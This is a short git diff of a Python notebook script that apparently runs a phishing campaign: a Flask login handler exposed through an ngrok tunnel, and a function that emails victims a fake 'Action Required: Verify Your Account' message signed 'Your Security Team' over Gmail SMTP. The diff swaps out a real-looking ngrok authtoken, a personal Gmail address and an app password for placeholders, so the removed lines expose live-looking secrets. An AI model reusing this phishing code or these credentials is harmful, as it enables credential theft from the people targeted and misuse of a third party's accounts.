@@ -77,7 +77,7 @@ def handle_login():
     )
 
 # Step 1: Configure ngrok authtoken
-!ngrok config add-authtoken "2qtcZPEKPcyEUYXlOrquRTew1Jg_61g2LR8PiAVSBqTee7Nse"
+!ngrok config add-authtoken " "# use your token
 
 # Step 2: Import Flask and pyngrok
 from flask import Flask
@@ -109,13 +109,13 @@ def send_phishing_email(recipient_email, phishing_link):
         "Thank you,\nYour Security Team"
     )
     message["Subject"] = "Action Required: Verify Your Account"
-    message["From"] = "sriram.dk2004@gmail.com"
+    message["From"] = " " # use your mail id
     message["To"] = recipient_email
 
     smtp_server = "smtp.gmail.com"
     smtp_port = 587
-    smtp_user = "sriram.dk2004@gmail.com"
-    smtp_password = "efwx zxxe xsjy qtgk"
+    smtp_user =  " " #use your mail id
+    smtp_password = " " #use your password
 
     try:
         with smtplib.SMTP(smtp_server, smtp_port) as server:
